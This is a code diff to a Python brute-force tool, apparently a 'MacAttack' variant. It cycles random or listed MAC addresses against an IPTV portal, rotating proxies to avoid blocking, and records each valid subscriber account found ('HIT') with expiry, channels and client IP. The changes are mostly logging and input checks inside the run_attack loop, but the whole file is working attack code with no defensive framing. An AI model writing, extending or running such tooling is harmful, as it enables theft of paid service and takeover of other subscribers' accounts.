@@ -495,9 +495,22 @@ def run_attack(portal_id):
     mac_list = config.get("mac_list", []) if mode == "list" else []
     mac_list_index = 0
     
-    add_log(state, f"Attack started with {speed} threads", "info")
+    # Log mode and MAC list info
+    add_log(state, f"Attack started with {speed} threads, mode: {mode}", "info")
+    if mode == "list":
+        add_log(state, f"MAC list has {len(mac_list)} entries", "info")
+        state["mac_list_total"] = len(mac_list)
+        if len(mac_list) == 0:
+            add_log(state, "WARNING: MAC list is empty!", "warning")
+            state["running"] = False
+            return
+    else:
+        add_log(state, f"Using random MACs with prefix: {mac_prefix}", "info")
+    
     if use_proxies and proxies:
-        add_log(state, f"Using {len(proxies)} proxies (SOCKS4/5 supported)", "info")
+        add_log(state, f"Using {len(proxies)} proxies with rotation", "info")
+    elif use_proxies and not proxies:
+        add_log(state, "WARNING: Use Proxies enabled but no proxies loaded!", "warning")
     
     with ThreadPoolExecutor(max_workers=speed) as executor:
         futures = {}
@@ -510,7 +523,7 @@ def run_attack(portal_id):
                 break
             
             if mode == "list" and mac_list_index >= len(mac_list):
-                add_log(state, "MAC list exhausted. Attack complete.", "success")
+                add_log(state, f"MAC list exhausted ({mac_list_index} tested). Attack complete.", "success")
                 break
             
             while len(futures) < speed and state["running"]:
@@ -525,7 +538,6 @@ def run_attack(portal_id):
                 
                 proxy = None
                 if proxies:
-                    # Get proxy respecting error counts
                     working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
                     if not working_proxies:
                         proxy_error_counts.clear()
@@ -533,6 +545,10 @@ def run_attack(portal_id):
                     proxy = working_proxies[proxy_index % len(working_proxies)]
                     proxy_index += 1
                     state["current_proxy"] = proxy
+                
+                # Log that we're testing this MAC
+                proxy_info = f" via {proxy}" if proxy else ""
+                add_log(state, f"Testing {mac}{proxy_info}", "info")
                 
                 future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                 futures[future] = (mac, proxy)
@@ -551,7 +567,6 @@ def run_attack(portal_id):
                     if success:
                         state["hits"] += 1
                         
-                        # Build display info like original MacAttack
                         expiry = result.get("expiry", "Unknown")
                         channels = result.get("channels", 0)
                         genres = result.get("genres", [])
@@ -563,11 +578,10 @@ def run_attack(portal_id):
                             "time": datetime.now().strftime("%H:%M:%S")
                         })
                         
-                        # Log with channels count like original
-                        add_log(state, f"HIT! {mac} - Expiry: {expiry} - Channels: {channels}{proxy_info}", "success")
+                        add_log(state, f"🎯 HIT! {mac} - Expiry: {expiry} - Channels: {channels}{proxy_info}", "success")
                         
-                        # Save full result to config (persistent storage)
-                        config["found_macs"].append({
+                        # Save to persistent storage
+                        found_entry = {
                             "mac": mac,
                             "expiry": expiry,
                             "portal": portal_url,
@@ -582,36 +596,31 @@ def run_attack(portal_id):
                             "created_at": result.get("created_at"),
                             "client_ip": result.get("client_ip"),
                             "found_at": datetime.now().isoformat()
-                        })
+                        }
+                        config["found_macs"].append(found_entry)
+                        logger.info(f"Saved found MAC to config: {mac}")
+                        
                         if settings.get("auto_save", True):
                             save_config()
+                            logger.info(f"Config saved with {len(config['found_macs'])} found MACs")
                     else:
-                        # Log every test with proxy info
-                        add_log(state, f"Testing {mac}{proxy_info}", "info")
-                        
-                        # Track proxy errors - check the result dict for error info
-                        if result and isinstance(result, dict):
-                            # result contains mac, portal, expiry=None etc when failed
-                            pass  # No specific error message in result dict
-                        
-                        # Log progress every 10 MACs
-                        if state["tested"] % 10 == 0:
-                            add_log(state, f"Progress: {state['tested']} tested, {state['hits']} hits{proxy_info}", "info")
+                        add_log(state, f"✗ {mac} - No valid account{proxy_info}", "info")
                     
                 except Exception as e:
                     state["tested"] += 1
                     state["errors"] += 1
                     error_msg = str(e).lower()
+                    proxy_info = f" via {proxy}" if proxy else ""
                     if "timeout" in error_msg or "connection" in error_msg or "proxy" in error_msg:
                         mark_proxy_error(proxy, is_connection_error=True)
-                        add_log(state, f"Proxy error for {mac}: {str(e)[:50]}", "warning")
+                        add_log(state, f"⚠ Proxy error: {mac}{proxy_info} - {str(e)[:30]}", "warning")
                     else:
-                        add_log(state, f"Error testing {mac}: {str(e)[:50]}", "error")
+                        add_log(state, f"✗ Error: {mac} - {str(e)[:50]}", "error")
             
-            time.sleep(0.01)
+            time.sleep(0.05)
     
     state["running"] = False
-    add_log(state, f"Finished. Tested: {state['tested']}, Hits: {state['hits']}", "info")
+    add_log(state, f"✓ Finished. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")
 
 
 def test_mac_worker(portal_url, mac, proxy, timeout):
